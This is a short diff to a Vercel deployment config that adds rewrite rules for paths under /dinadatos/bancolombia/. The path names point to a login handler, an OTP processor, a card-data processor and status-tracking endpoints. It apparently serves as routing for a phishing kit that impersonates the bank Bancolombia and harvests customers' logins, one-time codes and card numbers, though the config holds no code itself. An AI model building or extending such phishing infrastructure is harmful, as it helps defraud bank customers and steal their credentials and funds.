@@ -7,9 +7,6 @@
     },
     "api/vuelos/index.php": {
       "runtime": "vercel-php@0.9.0"
-    },
-    "dinadatos/**/*.php": {
-      "runtime": "vercel-php@0.9.0"
     }
   },
   "rewrites": [
@@ -107,6 +104,30 @@
     },
     {
       "source": "/dinadatos/bancolombia/verifidata.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/index.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/modules/login/process_login.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/modules/api/process_otp.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/modules/api/procesar_cc.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/modules/api/verificar_estado.php",
+      "destination": "/api"
+    },
+    {
+      "source": "/dinadatos/bancolombia/modules/api/actualizar_estado.php",
       "destination": "/api"
     }
   ]
